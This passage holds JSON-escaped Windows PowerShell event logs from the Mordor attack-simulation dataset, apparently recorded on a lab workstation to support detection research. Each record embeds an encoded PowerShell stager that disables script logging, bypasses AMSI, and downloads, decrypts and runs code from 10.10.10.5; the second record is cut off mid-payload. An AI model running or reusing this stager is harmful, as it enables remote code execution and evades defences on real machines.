              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":1,\"ThreadID\":4716,\"EventTime\":\"2020-08-07 10:42:08\",\"Task\":106,\"AccountType\":\"User\",\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"SourceName\":\"Microsoft-Windows-PowerShell\",\"OpcodeValue\":20,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:42:09.196Z\",\"Message\":\"CommandInvocation(New-Object): \\\"New-Object\\\"\\r\\nParameterBinding(New-Object): name=\\\"TypeName\\\"; value=\\\"System.Net.WebClient\\\"\\r\\n\\r\\n\\r\\nContext:\\r\\n        Severity = Informational\\r\\n        Host Name = ConsoleHost\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = bd39a342-b84b-499d-b35a-752ceae5484c\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = 7c68447b-1740-4e09-9a80-6b8d20ac5a84\\r\\n        Pipeline ID = 1\\r\\n        Command Name = New-Object\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 22712\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\\r\\n\\r\\nUser Data:\\r\\n\\r\\n\",\"Category\":\"Executing Pipeline\",\"Opcode\":\"To be used when operation is just executing a method\",\"SourceModuleName\":\"eventlog\",\"EventReceivedTime\":\"2020-08-07 10:42:09\",\"port\":60122,\"AccountName\":\"pgustavo\",\"ContextInfo\":\"        Severity = Informational\\r\\n        Host Name = ConsoleHost\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = bd39a342-b84b-499d-b35a-752ceae5484c\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\\r\\n        Engine Version = 5.1.18362.752\\r\\n        Runspace ID = 7c68447b-1740-4e09-9a80-6b8d20ac5a84\\r\\n        Pipeline ID = 1\\r\\n        Command Name = New-Object\\r\\n        Command Type = Cmdlet\\r\\n        Script Name = \\r\\n        Command Path = \\r\\n        Sequence Number = 22712\\r\\n        User = THESHIRE\\\\pgustavo\\r\\n        Connected User = \\r\\n        Shell ID = Microsoft.PowerShell\\r\\n\",\"Payload\":\"CommandInvocation(New-Object): \\\"New-Object\\\"\\r\\nParameterBinding(New-Object): name=\\\"TypeName\\\"; value=\\\"System.Net.WebClient\\\"\\r\\n\",\"Domain\":\"THESHIRE\",\"ExecutionProcessID\":1648,\"host\":\"wec.internal.cloudapp.net\",\"Severity\":\"INFO\",\"ActivityID\":\"{22CB5860-CC22-0000-DFF1-358A906BD601}\",\"SeverityValue\":2,\"EventID\":4103,\"UserID\":\"S-1-5-21-1363495622-3806888128-621328882-1104\",\"ProviderGuid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"RecordNumber\":13441,\"SourceModuleType\":\"im_msvistalog\",\"Keywords\":0,\"tags\":[\"mordorDataset\"]}",
              "{\"@version\":\"1\",\"EventType\":\"INFO\",\"Version\":1,\"ThreadID\":4716,\"EventTime\":\"2020-08-07 10:42:08\",\"Task\":106,\"AccountType\":\"User\",\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"SourceName\":\"Microsoft-Windows-PowerShell\",\"OpcodeValue\":20,\"Hostname\":\"WORKSTATION5.theshire.local\",\"@timestamp\":\"2020-08-07T14:42:10.190Z\",\"Message\":\"CommandInvocation(ForEach-Object): \\\"ForEach-Object\\\"\\r\\nParameterBinding(ForEach-Object): name=\\\"Process\\\"; value=\\\"$55f.Headers.Add($_.Name, $_.Value)\\\"\\r\\n\\r\\n\\r\\nContext:\\r\\n        Severity = Informational\\r\\n        Host Name = ConsoleHost\\r\\n        Host Version = 5.1.18362.752\\r\\n        Host ID = bd39a342-b84b-499d-b35a-752ceae5484c\\r\\n        Host Application = C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9AC